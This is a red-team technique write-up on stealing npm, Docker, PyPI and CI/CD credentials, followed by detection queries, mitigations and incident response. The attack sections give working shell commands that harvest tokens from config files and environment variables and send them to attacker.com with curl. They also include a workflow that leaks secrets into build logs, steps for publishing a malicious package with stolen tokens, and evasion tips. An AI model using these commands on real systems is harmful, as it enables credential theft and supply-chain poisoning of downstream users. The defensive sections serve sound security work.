# [SUPPLY-CHAIN-004]: Package Manager Credential Theft

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-004 |
| **MITRE ATT&CK v18.1** | [Compromise Software Dependencies and Development Tools (T1195.001)](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Credential Access / Exfiltration |
| **Platforms** | Entra ID / DevOps (npm, Docker, Maven, NuGet, PyPI credentials) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions:** | npm (all), PyPI (all), Maven Central (all), Docker Hub (all), NuGet (all) |
| **Patched In** | N/A - credential theft attack |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

- **Concept:** Package manager credential theft involves harvesting authentication tokens, API keys, and credentials stored by package managers (npm, pip, docker, maven, nuget) on developer machines, build servers, or CI/CD environments. Attackers use these stolen credentials to authenticate to artifact registries (npm, Docker Hub, PyPI, Maven Central) with the privileges of the compromised user or service account. Once authenticated, attackers can publish malicious packages, overwrite legitimate packages, or gain access to private/internal repositories. This technique is critical because package manager credentials are highly privileged (can publish to any package namespace the account owns) and are often stored in plaintext or easily-accessible configuration files.

- **Attack Surface:** `~/.npmrc`, `~/.pypirc`, `~/.docker/config.json`, `~/.m2/settings.xml`, `~/.nuget/nuget.config`, CI/CD environment variables (`GITHUB_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD`), CI/CD build logs (often contain plaintext credentials), Git repositories (credentials accidentally committed), environment variables, memory dumps of running CI/CD agents.

- **Business Impact:** **Complete compromise of package publishing pipeline.** Attackers with stolen credentials can publish malicious packages to any registry where the compromised account has permissions. If the account belongs to a popular package maintainer, attackers can directly poison widely-used packages (affecting hundreds of thousands of downstream users). Additionally, stolen credentials provide access to private/internal repositories, enabling espionage, theft of source code, and access to secrets stored in private packages (database passwords, API keys, SSL certificates).

- **Technical Context:** Credential theft typically occurs during initial compromise or exploitation of CI/CD systems. Time-to-exploit is 2-10 minutes once an attacker has access to a compromised system or can intercept network traffic. Detection likelihood is medium if secrets are stored in plaintext but can be low if credentials are encrypted or stored in secure vaults. Once stolen, credentials are valid for extended periods (weeks to months or indefinitely, depending on expiration settings).

### Operational Risk

- **Execution Risk:** Medium - Requires access to developer machine, build agent, or CI/CD environment. However, many developers store credentials in plaintext, making this a high-probability attack.
- **Stealth:** High - Credential theft leaves minimal artifacts if done via memory access or log exfiltration. Credentials in plaintext are indistinguishable from legitimate use.
- **Reversibility:** Partial - Stolen credentials can be revoked by deleting tokens, but if already used for malicious publishing, damage is done. Remediation requires identifying all malicious packages and rotating all credentials organization-wide.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS v1.4.0 – CDM-2.1 | API keys and secrets must not be stored in plaintext. Use secret management systems (e.g., Azure Key Vault, HashiCorp Vault). |
| **DISA STIG** | IA-4(a) – Identifier Management | Access tokens and credentials must be protected from unauthorized disclosure. |
| **CISA SCuBA** | SCUBA-SECRETS-01 | Credentials must be stored securely and rotated at least every 90 days. |
| **NIST 800-53** | IA-2(1) – Authentication, MFA | API tokens should be treated as equivalent to passwords and protected accordingly. |
| **GDPR** | Art. 32 – Security of Processing | Technical measures must protect credentials used to access data processing systems. |
| **DORA** | Art. 10 – Testing of ICT Tools and Services | Credentials for third-party services must be rotated and monitored regularly. |
| **NIS2** | Art. 21 – Access Control | Critical infrastructure operators must protect credentials with encryption and MFA. |
| **ISO 27001** | A.9.4.3 – Password Management | Credentials must be unique, complex, and rotated regularly. |
| **ISO 27005** | Risk: Unauthorized Access to Credentials | Assess risks of credential compromise and implement detective/responsive controls. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Access to developer machine, build agent, or CI/CD environment. Ability to read files (read access to `~/.npmrc`, `~/.docker/config.json`, etc.). Ability to execute commands or access process memory.

- **Required Access:** Local access to system where credentials are stored, or network access to intercept credential transmission (MITM attacks), or access to CI/CD build logs that echo credentials.

**Supported Versions:**
- **npm:** All versions (6.0+)
- **Docker:** All versions
- **PyPI/pip:** All versions (20.0+)
- **Maven:** All versions (3.6+)
- **NuGet:** All versions

- **Tools:**
    - [curl](https://curl.se/) (all versions, for credential exfiltration)
    - [jq](https://stedolan.github.io/jq/) (JSON parsing of config files)
    - [grep/sed/awk](https://www.gnu.org/software/grep/) (text searching)
    - [base64](https://en.wikipedia.org/wiki/Base64) (encoding for exfiltration)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Developer Machine Credential Enumeration

```bash
# List npm tokens and registries configured
cat ~/.npmrc 2>/dev/null
# OUTPUT: //registry.npmjs.org/:_authToken=npm_xxxxxxxxxxxxxx

# List pip credentials
cat ~/.pypirc 2>/dev/null

# List Docker credentials (base64 encoded)
cat ~/.docker/config.json | jq '.auths' 2>/dev/null

# List Maven credentials
cat ~/.m2/settings.xml 2>/dev/null

# Check for credentials in environment variables
env | grep -i -E "token|secret|key|password|credential"

# Search Git history for accidentally committed credentials
git log -p | grep -i -E "api_key|token|password" | head -20

# Check shell history for credential commands
history | grep -E "npm login|docker login|pip config"

# Search for .env files containing secrets
find ~ -name ".env" -o -name ".env.local" -o -name "secrets.txt" 2>/dev/null | xargs cat
```

**What to Look For:**
- `_authToken=npm_` (npm tokens start with `npm_`)
- `docker.io` or other registry entries with `auth` field (base64-encoded credentials)
- `<password>` tags in Maven settings.xml (plaintext passwords)
- PyPI credentials in `~/.pypirc`
- Environment variables like `NPM_TOKEN`, `DOCKER_PASSWORD`, `PYPI_API_TOKEN`

#### CI/CD Environment Reconnaissance

```bash
# Check CI/CD environment variables (often set as secrets)
printenv | grep -i -E "token|secret|key|password"

# GitHub Actions: Check for hardcoded tokens in workflow logs
curl -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/{owner}/{repo}/actions/runs/{run-id}/logs" | \
  grep -E "npm_.*|ghp_.*|DOCKER_PASSWORD"

# Azure Pipelines: Check build logs for exposed tokens
az pipelines runs logs --organization "https://dev.azure.com/{org}" \
  --project "{project}" --id "{run-id}" | grep -i "token\|secret"

# GitLab CI: Check pipeline trace logs
curl -H "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  "https://gitlab.com/api/v4/projects/{project_id}/pipelines/{pipeline_id}/jobs/{job_id}/trace"
```

**What to Look For:**
- `GITHUB_TOKEN=ghu_` or `ghp_`
- `NPM_TOKEN=npm_`
- `DOCKER_PASSWORD=` or `DOCKER_USERNAME=`
- `ARTIFACTORY_KEY=`, `NEXUS_PASSWORD=`
- AWS `AKIA` keys, Azure `AZURE_` prefixed variables

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Plaintext npm Token Harvesting from Developer Machine

**Supported Versions:** npm (all versions), Node.js (all)

#### Step 1: Identify Target Developer Machine with npm Credentials

**Objective:** Locate developer machines that have npm tokens stored locally.

**Command (Via Malware/Trojan):**
```bash
# Reconnaissance to find npm credentials
ls -la ~/.npmrc 2>/dev/null && echo "npm credentials found"

# Extract token
npm_token=$(grep "_authToken" ~/.npmrc 2>/dev/null | cut -d'=' -f2)

# Verify token is valid
curl -H "Authorization: Bearer $npm_token" https://registry.npmjs.org/whoami

# If valid, exfiltrate
echo $npm_token | curl -X POST -d @- https://attacker.com/collect-tokens
```

**Expected Output (Success):**
```
npm credentials found
{
  "username": "developer-account",
  "email": "dev@company.com"
}
```

**What This Means:**
- npm token is valid and authenticated to npm registry
- Developer account has likely published multiple packages
- Token can be used to publish malicious packages impersonating the developer

#### Step 2: Extract Token from .npmrc (Often Plaintext)

**Objective:** Parse npm configuration file and extract authentication token.

**Command:**
```bash
# Read .npmrc file (usually plaintext or lightly obfuscated)
cat ~/.npmrc

# Expected format:
# //registry.npmjs.org/:_authToken=npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
# @company:registry=https://artifactory.company.com/artifactory/api/npm/npm-release/
# //artifactory.company.com/artifactory/api/npm/npm-release/:_authToken=xxxxxxxxxx
# //artifactory.company.com/artifactory/api/npm/npm-release/:email=dev@company.com

# Extract all tokens
grep "_authToken" ~/.npmrc | cut -d'=' -f2

# If .npmrc is encrypted or obfuscated:
# npm doesn't encrypt tokens; they are stored in plaintext
# However, some tools may base64-encode them
cat ~/.npmrc | base64 -d

# Extract specific registry token
registry_token=$(grep -A 1 "@company:registry" ~/.npmrc | grep "_authToken" | cut -d'=' -f2)
```

**OpSec & Evasion:**
- `.npmrc` is world-readable if permissions are not set correctly: `chmod 600 ~/.npmrc` (properly secured)
- Many developers accidentally store credentials with read permissions
- Extraction can be done by any process running as the same user
- Detection likelihood: **Medium** - file access is logged if audit is enabled

#### Step 3: Authenticate and Validate Token

**Objective:** Verify stolen token is valid and determine what repositories attacker can access.

**Command:**
```bash
# Authenticate with stolen npm token
npm set //registry.npmjs.org/:_authToken=${STOLEN_NPM_TOKEN}

# Check identity (verify token is valid)
npm whoami
# OUTPUT: legitimate-developer

# List packages this account owns or can publish to
npm access ls-packages
# OUTPUT:
# my-app ( read-write )
# popular-utility ( read-write )
# internal-lib ( read-write )

# Check token scope (what permissions it has)
npm token list 2>/dev/null

# Query npm API to enumerate public packages by this user
curl -s "https://registry.npmjs.org/-/user/org.couchdb.user:{username}" \
  -H "Authorization: Bearer ${STOLEN_NPM_TOKEN}" | jq '.packages'
```

**Expected Output:**
```json
{
  "my-app": "read-write",
  "popular-utility": "read-write",
  "internal-lib": "read-write"
}
```

**What This Means:**
- Attacker can publish to all three packages
- If any package has millions of weekly downloads, attacker has massive reach
- Attacker can overwrite existing versions or publish new malicious versions

---

### METHOD 2: Docker Credentials Harvesting from ~/.docker/config.json

**Supported Versions:** Docker (all versions), all Docker registries

#### Step 1: Extract Base64-Encoded Docker Registry Credentials

**Objective:** Parse Docker config.json and decode base64-encoded credentials.

**Command:**
```bash
# Read Docker config file
cat ~/.docker/config.json | jq '.auths'

# Example output:
# {
#   "https://index.docker.io/v1/": {
#     "auth": "dXNlcm5hbWU6cGFzc3dvcmQ="
#   },
#   "myregistry.azurecr.io": {
#     "auth": "dXNlcm5hbWU6cGFzc3dvcmQ=",
#     "email": "user@company.com"
#   }
# }

# Decode base64 credentials
auth_string=$(cat ~/.docker/config.json | jq -r '.auths["https://index.docker.io/v1/"].auth')
echo $auth_string | base64 -d
# OUTPUT: username:password

# Extract username and password separately
username=$(echo $auth_string | base64 -d | cut -d':' -f1)
password=$(echo $auth_string | base64 -d | cut -d':' -f2)

echo "Docker Hub Username: $username"
echo "Docker Hub Password: $password"

# Extract all registry credentials
cat ~/.docker/config.json | jq '.auths | to_entries[] | {registry: .key, username: (.value.auth | @base64d | split(":")[0]), password: (.value.auth | @base64d | split(":")[1])}'
```

**Expected Output:**
```json
{
  "registry": "https://index.docker.io/v1/",
  "username": "legitimate-developer",
  "password": "actual-password-here"
}
```

**What This Means:**
- Docker credentials are base64-encoded (not encrypted), easily decoded
- Username and password can be used to authenticate to Docker Hub
- Attacker can push malicious images to any repository the account has access to

#### Step 2: Authenticate to Docker Registry with Stolen Credentials

**Objective:** Verify stolen Docker credentials and enumerate accessible repositories.

**Command:**
```bash
# Authenticate to Docker Hub with stolen credentials
docker login -u $username -p $password

# Verify authentication
docker info | grep Username

# List repositories accessible to this account
curl -s "https://hub.docker.com/v2/users/{username}/repositories/" \
  -H "Authorization: Bearer $(docker inspect $(docker create $username/$(docker ps -aq | tail -1) true) --format='{{.Config.Labels.dockerToken}}')" | \
  jq '.results[] | {name: .name, push_permission: .has_admin}'

# Alternative: enumerate via Docker API
docker ps -a --format "table {{.Image}}" | while read image; do
  docker push $image  # Attempt push to verify access
done
```

**OpSec & Evasion:**
- Docker credentials are stored after successful login
- Credentials remain valid until explicitly revoked or token expires
- `docker login` can be automated without user interaction
- Detection likelihood: **Medium** - Docker authentication attempts are logged in Docker daemon logs

---

### METHOD 3: CI/CD Environment Variable Credential Exfiltration

**Supported Versions:** GitHub Actions (all), Azure Pipelines (all), GitLab CI (all), Jenkins (all)

#### Step 1: Access CI/CD Environment Variables

**Objective:** Extract credentials from CI/CD build environment where secrets are injected.

**Command (GitHub Actions):**
```bash
# In a GitHub Actions workflow, all secrets are available as environment variables
env | grep -E "^[A-Z_]+_(TOKEN|PASSWORD|SECRET|KEY)="

# Exfiltrate via curl
curl -X POST https://attacker.com/webhook \
  -d "github_token=$GITHUB_TOKEN&npm_token=$NPM_TOKEN&docker_password=$DOCKER_PASSWORD"

# Or write to artifact (then download later)
env | grep TOKEN > /tmp/secrets.txt
```

**Command (Azure Pipelines):**
```bash
# Azure Pipelines makes secrets available as environment variables
env | grep -E "^SYSTEM_|^BUILD_|^RELEASE_"

# Special variable: SYSTEM_ACCESSTOKEN (very high privilege)
echo $SYSTEM_ACCESSTOKEN | curl -d @- https://attacker.com/webhook

# Extract task authentication token
echo $SYSTEM_TEAMFOUNDATIONCOLLECTIONURI
```

**Command (GitLab CI):**
```bash
# GitLab injects secrets as CI_ prefixed variables
env | grep ^CI_

# Extract job token
echo $CI_JOB_TOKEN | curl -d @- https://attacker.com/webhook
```

**Expected Output (Exfiltrated Secrets):**
```
GITHUB_TOKEN=ghu_xxxxxxxxxxxxxxxxxxx
NPM_TOKEN=npm_xxxxxxxxxxxxxxxxxxx
DOCKER_PASSWORD=mypassword123
SYSTEM_ACCESSTOKEN=xxxxxxxxxxxxxxxxxxxx
```

**OpSec & Evasion:**
- CI/CD platforms log stdout/stderr from jobs, but logs are usually not searched automatically
- If logs are public (as in many open-source projects), secrets are directly visible
- Use `echo` or pipe to redirect output to files instead of stdout
- Encode with base64 to obfuscate patterns
- Detection likelihood: **High** - If logs are searched for secrets, patterns are easily detected

#### Step 2: Use Exfiltrated Credentials for Malicious Publishing

**Objective:** Authenticate with stolen credentials and publish malicious packages.

**Command:**
```bash
# Use stolen npm token
npm set //registry.npmjs.org/:_authToken=${STOLEN_NPM_TOKEN}

# Create malicious package
mkdir malicious-package && cd malicious-package
npm init -y

# Add postinstall hook
jq '.scripts.postinstall = "node setup.js"' package.json > package.json.tmp
mv package.json.tmp package.json

# Increment version
npm version patch

# Publish (now using stolen credentials)
npm publish
```

---

### METHOD 4: CI/CD Build Log Credential Extraction (Accidental Exposure)

**Supported Versions:** GitHub Actions (all), Azure Pipelines (all), GitLab CI (all)

#### Step 1: Trigger Build Job That Echoes Secrets to Logs

**Objective:** Cause CI/CD build to output secrets in logs via script echo or debugging.

**Command (GitHub Actions Workflow):**
```yaml
name: Expose Secrets
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Debug Environment
        run: |
          echo "Debugging build environment..."
          env | sort  # Outputs all environment variables including secrets
          
      - name: Show token
        run: echo "Token: ${{ secrets.NPM_TOKEN }}"  # Outputs secret to log
        
      - name: List config
        run: |
          cat ~/.npmrc    # If file exists with credentials
          cat ~/.docker/config.json
```

**Expected Output (In Build Logs):**
```
GITHUB_TOKEN=ghu_xxxxxxxxxxxxxxxx
NPM_TOKEN=npm_xxxxxxxxxxxxxxxx
DOCKER_PASSWORD=mypassword
```

**OpSec & Evasion:**
- GitHub redacts known secret patterns in logs (e.g., `ghu_*`, `npm_*`)
- However, custom secrets or patterns not recognized will appear in plaintext
- Secrets in logs are visible if:
  - Repository is public (anyone can read logs)
  - Logs are not properly cleaned
  - Secrets are injected into stdout/stderr directly

#### Step 2: Download and Parse Build Logs

**Objective:** Retrieve build logs from CI/CD platform and extract credentials.

**Command (GitHub):**
```bash
# Download workflow logs
gh run download {run-id} --repo {owner}/{repo} --dir /tmp/logs

# Parse logs for secrets
grep -r "TOKEN\|PASSWORD\|SECRET\|KEY" /tmp/logs/ | \
  grep -oE "npm_[a-zA-Z0-9]+|ghp_[a-zA-Z0-9]+" > /tmp/stolen-tokens.txt

# For public repositories, logs are publicly accessible
curl -s "https://github.com/{owner}/{repo}/actions/runs/{run-id}/attempts/{attempt}/logs/{job-id}" | \
  grep -oE "npm_[a-zA-Z0-9]+" > /tmp/npm-tokens.txt
```

**OpSec & Evasion:**
- Public repository logs are accessible to anyone without authentication
- Attacker can write automated crawler to search public logs for secrets
- GitHub provides API: `https://api.github.com/repos/{owner}/{repo}/actions/runs`
- Detection likelihood: **Low** if secrets are not properly redacted in logs

---

## 5. SPLUNK DETECTION RULES

#### Rule 1: Detect Unusual Package Registry Authentication

**Rule Configuration:**
- **Required Index:** npm_audit, docker_logs, registry_audit
- **Required Sourcetype:** npm:auth, docker:auth, registry:login
- **Required Fields:** username, token, source_ip, timestamp
- **Alert Threshold:** > 0 events with suspicious authentication patterns
- **Applies To Versions:** npm (all), Docker (all), PyPI (all)

**SPL Query:**
```spl
index=npm_audit source="auth" OR source="login"
| where
  (source_ip NOT IN ("office-ip-range", "ci-server-ips") OR
   time_of_day < 6 OR time_of_day > 22)  /* Outside business hours or non-office IP */
  AND (user_agent CONTAINS "curl" OR user_agent CONTAINS "wget" OR user_agent CONTAINS "python")  /* Scripted authentication */
| stats count by username, source_ip, time_of_day
| where count > 3  /* Multiple authentications in short window */
```

**What This Detects:**
- Authentication from unusual IP addresses
- Authentication outside business hours
- Scripted/automated authentication (curl, wget, python)
- Multiple rapid authentications

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Credential Exfiltration from CI/CD Logs

**Rule Configuration:**
- **Required Table:** AzureDiagnostics, GithubAuditLog, AzureDevOpsAudit
- **Required Fields:** LogContent, Actor, OperationName, TimeGenerated
- **Alert Severity:** Critical
- **Frequency:** Run every 1 minute
- **Applies To Versions:** Azure DevOps (all), GitHub (all)

**KQL Query:**
```kusto
GithubAuditLog
| where TimeGenerated > ago(1m)
| where action == "workflows.completed_workflow_run"
| extend LogContent = tostring(log_content)
| where LogContent contains_cs ("npm_" OR "ghu_" OR "ghp_" OR "AKIA" OR "DOCKER_PASSWORD")  /* Credential patterns */
| project TimeGenerated, actor, repository, LogContent
| summarize CredentialExposures = count() by actor, repository
| where CredentialExposures > 0
```

**What This Detects:**
- Build logs containing plaintext credentials
- GitHub tokens (`ghu_`, `ghp_`)
- npm tokens (`npm_`)
- AWS keys (`AKIA`)
- Docker credentials (`DOCKER_PASSWORD`)

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Never store credentials in plaintext (use secret management systems):**
    
    **Azure Key Vault:**
    ```bash
    # Store npm token in Key Vault (not in ~/.npmrc)
    az keyvault secret set --vault-name "my-keyvault" --name "npm-token" --value "$NPM_TOKEN"
    
    # Retrieve in CI/CD pipeline
    npm_token=$(az keyvault secret show --vault-name "my-keyvault" --name "npm-token" --query "value" -o tsv)
    npm set //registry.npmjs.org/:_authToken=$npm_token
    ```
    
    **Docker Secret Management:**
    ```bash
    # Use Docker secret (if on Swarm)
    docker secret create docker-creds docker-config.json
    
    # Or use Docker Buildkit with secret mounts
    docker buildx build \
      --secret id=docker_creds,src=~/.docker/config.json \
      -t myimage:latest .
    ```
    
    **Kubernetes Secrets:**
    ```bash
    # Create secret for Docker credentials
    kubectl create secret docker-registry dockercfg \
      --docker-server=index.docker.io \
      --docker-username=username \
      --docker-password=password \
      --docker-email=email@example.com
    
    # Use in deployment
    imagePullSecrets:
    - name: dockercfg
    ```

* **Implement credential rotation (90-day maximum lifetime):**
    
    **npm Token Rotation:**
    ```bash
    # List tokens
    npm token list
    
    # Revoke old token
    npm token revoke {token-id}
    
    # Generate new token with limited scope
    npm token create --read-only
    ```
    
    **Docker Credential Rotation:**
    1. Generate personal access token (PAT) in Docker Hub instead of password
    2. Revoke all old PATs in Docker Hub settings
    3. Update all systems to use new PAT
    
    **Azure Automation:**
    ```powershell
    # Automated credential rotation every 90 days
    $secretName = "npm-token"
    $expiryDate = (Get-Date).AddDays(-90)
    
    # Check if token needs rotation
    $lastRotation = (az keyvault secret show --vault-name "my-kv" --name "$secretName-date" --query "value").Value
    
    if ([datetime]$lastRotation -lt $expiryDate) {
      # Generate new token
      $newToken = npm token create --read-only
      
      # Store in Key Vault
      az keyvault secret set --vault-name "my-kv" --name $secretName --value $newToken
      az keyvault secret set --vault-name "my-kv" --name "$secretName-date" --value (Get-Date).ToString()
      
      # Revoke old token
      npm token revoke $oldTokenId
    }
    ```

* **Enable MFA on package manager accounts:**
    
    **npm MFA:**
    1. Go to **npm.com** → **Account Settings** → **Two-Factor Authentication**
    2. Enable MFA with authenticator app or security key
    3. When publishing, MFA code is required: `npm publish --otp 123456`
    
    **Docker Hub MFA:**
    1. Go to **Docker Hub** → **Account Settings** → **Security**
    2. Enable **Two-Factor Authentication**
    
    **PyPI MFA:**
    1. Go to **PyPI** → **Account Settings** → **Two-factor authentication**
    2. Enable TOTP or Trusted Publishing

* **Use short-lived credentials (time-limited tokens):**
    
    **npm Temporary Token:**
    ```bash
    # Create token that expires in 24 hours
    npm token create --expires-in 1d
    ```
    
    **GitHub OIDC Tokens (Workload Identity Federation):**
    ```yaml
    # GitHub Actions workflow using OIDC (no long-lived PAT required)
    - name: Authenticate to npm
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        registry-url: 'https://registry.npmjs.org'
    
    # Token is automatically provisioned via OIDC, expires in 15 minutes
    - name: Publish
      run: npm publish
      env:
        NODE_AUTH_TOKEN: ${{ secrets.npm_token }}  # Short-lived OIDC token
    ```
    
    **Azure Workload Identity:**
    ```bash
    # Use Azure AD managed identity (no credential storage needed)
    az login --service-principal -u $AZURE_CLIENT_ID -p $AZURE_CLIENT_SECRET --tenant $AZURE_TENANT_ID
    ```

#### Priority 2: HIGH

* **Mask secrets in CI/CD logs (prevent accidental exposure):**
    
    **GitHub Actions:**
    ```yaml
    - name: Build
      run: npm publish
      env:
        NPM_TOKEN: ${{ secrets.NPM_TOKEN }}  # Automatically masked in logs
    ```
    
    **Azure Pipelines:**
    ```yaml
    variables:
      NPM_TOKEN: $[variables['npmToken']]  # Stored as secret variable
    
    steps:
    - script: npm set //registry.npmjs.org/:_authToken=$(NPM_TOKEN)
      env:
        NPM_TOKEN: $(NPM_TOKEN)  # Masked when logged
    ```
    
    **Custom Log Masking:**
    ```bash
    # Mask secrets in script output
    credentials_file="/tmp/creds.txt"
    # ... populate credentials ...
    
    # Run script and redact output
    ./build.sh 2>&1 | sed 's/npm_[a-zA-Z0-9]*/npm_REDACTED/g'
    ```

* **Use distinct credentials for each service (principle of least privilege):**
    
    **Example Credential Strategy:**
    - npm token: only `publish` scope, **not** `admin`
    - Docker: create limited service account, not personal account
    - PyPI: separate CI/CD token, not account password
    - AWS: create IAM user with `iam:GetUser` + `ecr:*` only (not `*:*`)
    
    **AWS IAM Policy (Least Privilege):**
    ```json
    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Action": [
            "ecr:GetAuthorizationToken",
            "ecr:PutImage",
            "ecr:GetImage"
          ],
          "Resource": "arn:aws:ecr:us-east-1:123456789:repository/my-app*"
        }
      ]
    }
    ```

* **Monitor and alert on credential usage anomalies:**
    
    **npm Usage Monitoring:**
    ```bash
    # Monitor npm publish activity
    npm access list | grep -v "jq\|total" | while read line; do
      package=$(echo $line | cut -d' ' -f1)
      npm view $package --json | jq '.time.modified'
    done
    
    # Alert if modification is recent/unexpected
    ```
    
    **Docker Registry Audit:**
    ```bash
    # Query Docker Hub API for push activity
    curl -s "https://hub.docker.com/v2/repositories/{username}/{repo}/tags/?page_size=100" | \
      jq '.results[] | select(.last_pushed | strptime("%Y-%m-%dT%H:%M:%SZ") | mktime > now - 86400) | {name, last_pushed}'
    
    # Alert if unexpected push
    ```

---

## 8. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **File Access:**
  - `~/.npmrc` accessed by unexpected processes
  - `~/.docker/config.json` read
  - `~/.ssh/` or `~/.git-credentials` accessed
  - CI/CD log files created with unexpected content
  
* **Process Activity:**
  - `curl`, `wget` commands with webhook URLs in arguments
  - `base64` encoding/decoding unusual data
  - `npm login` or `docker login` from unusual IPs
  - Process spawning unexpected child processes from CI/CD job

* **Network Activity:**
  - Outbound connections to `https://attacker.com/webhook`
  - Outbound connections to uncommon registries
  - Registry authentication from unusual IP addresses
  - Large data exfiltration to external destinations

* **Package Registry:**
  - New package versions published by compromised account
  - Packages published with unusual code
  - Accounts publishing to registries they don't normally use
  - Changes to package permissions or access lists

#### Forensic Artifacts

* **Local System:**
  - `~/.npm` cache directory contains .tgz files of accessed packages
  - `~/.docker/config.json` history (can be reconstructed from git)
  - Bash history: `~/.bash_history` contains login commands
  - CI/CD build logs stored in `/var/log/ci-pipeline/`
  
* **Cloud Logs:**
  - npm audit logs show who published what, when
  - Docker Hub API logs show push events
  - GitHub Actions logs show environment variable access
  - Azure Pipelines audit log shows who accessed secrets
  
* **Network:**
  - Firewall logs show exfiltration to attacker servers
  - DNS logs show lookups to attacker domains
  - VPC Flow Logs show unusual outbound connections from CI/CD agents

#### Response Procedures

1.  **Identify Compromised Credentials:**
    ```bash
    # Check what credentials were potentially exposed
    npm token list
    docker info | grep "Username"
    
    # Check CI/CD audit logs for unusual activity
    gh run list --repo {owner}/{repo} --limit 100 | grep -i "publish\|unknown"
    
    # Check package registry for suspicious publishes
    npm view {package-name} time
    ```

2.  **Revoke Credentials Immediately:**
    ```bash
    # npm: revoke all tokens and regenerate
    npm token revoke {token-id}
    npm token create --read-only
    
    # Docker: generate new PAT and delete old
    docker logout
    # Manually generate new PAT in Docker Hub
    docker login --username {username}
    
    # GitHub: revoke compromised PAT
    gh auth revoke  # If using gh CLI
    curl -X DELETE \
      -H "Authorization: token $GITHUB_TOKEN" \
      https://api.github.com/authorizations/{authorization_id}
    ```

3.  **Remediate Published Artifacts:**
    ```bash
    # Unpublish malicious npm package
    npm unpublish {package-name}@{malicious-version} --force
    
    # Delete malicious Docker image
    docker image rm myregistry/myapp:malicious-tag
    
    # Contact registry admins to forcefully remove if attacker refuses
    ```

4.  **Update All Systems:**
    ```bash
    # Rotate credentials in all CI/CD systems
    # Update secrets in Azure Key Vault, GitHub Secrets, etc.
    # Redeploy applications with new credentials
    # Restart CI/CD agents to clear credential cache
    ```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | **[REC-CI-CD-001]** | Enumerate package manager configurations and stored credentials |
| **2** | **Initial Access** | **[IA-MALWARE-001]** | Deliver malware to developer machine or CI/CD agent |
| **3** | **Current Step** | **[SUPPLY-CHAIN-004]** | **Package Manager Credential Theft - harvest npm, Docker, PyPI tokens** |
| **4** | **Lateral Movement** | **[SUPPLY-CHAIN-003]** | Artifact Repository Poisoning - use stolen credentials to publish malicious packages |
| **5** | **Persistence** | **[PERSIST-003]** | Create backdoor service account with stolen credentials |
| **6** | **Impact** | **[SUPPLY-CHAIN-MASS-COMPROMISE]** | Poisoned packages distribute to downstream end-users |

---

## 10. REAL-WORLD EXAMPLES

#### Example 1: Shai-Hulud Credential Theft Chain (August 2025)

- **Target:** npm maintainer credentials (harvested via phishing)
- **Timeline:** Credentials stolen August 26, 2025; used to publish poisoned packages within hours
- **Technique Status:** Phishing email with npm security alert theme → credential harvesting → postinstall script exfiltrated GitHub, npm, AWS credentials → self-propagation
- **Impact:** Over 1,000 valid credentials exfiltrated. Stolen npm tokens used to poison 18+ additional packages. Stolen GitHub tokens used to access private repositories.
- **Detection:** GitHub detected unusual repository creation from attacker accounts within 8 hours
- **Reference:** [Wiz - Shai-Hulud Supply Chain Attack](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)

#### Example 2: GhostAction - CI/CD Secrets Exfiltration (September 2025)

- **Target:** GitHub Actions secrets (GITHUB_TOKEN, npm tokens, DockerHub credentials)
- **Timeline:** 327 GitHub users compromised; 3,325 secrets exfiltrated over several days
- **Technique Status:** Malicious workflow injected into repositories → echoed environment variables to logs → attacker scraped logs for credentials
- **Impact:** npm, PyPI, DockerHub tokens stolen. Attackers could have published malicious packages at scale.
- **Detection:** GitGuardian detected exfiltration patterns; community reported suspicious activity
- **Reference:** [StepSecurity - GhostAction Campaign](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows)

#### Example 3: Dependency Confusion Attack - npm Typosquatting (2021)

- **Target:** Internal company npm packages (e.g., `@company/internal-lib`)
- **Timeline:** Researcher published public npm packages with same names as internal packages
- **Technique Status:** Simple typosquatting; npm resolution prefers public over private registries
- **Impact:** When CI/CD tried to install internal packages, public malicious versions were installed instead
- **Detection:** Build failures; comparison of package registry settings
- **Reference:** [Alex Birsan - Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

---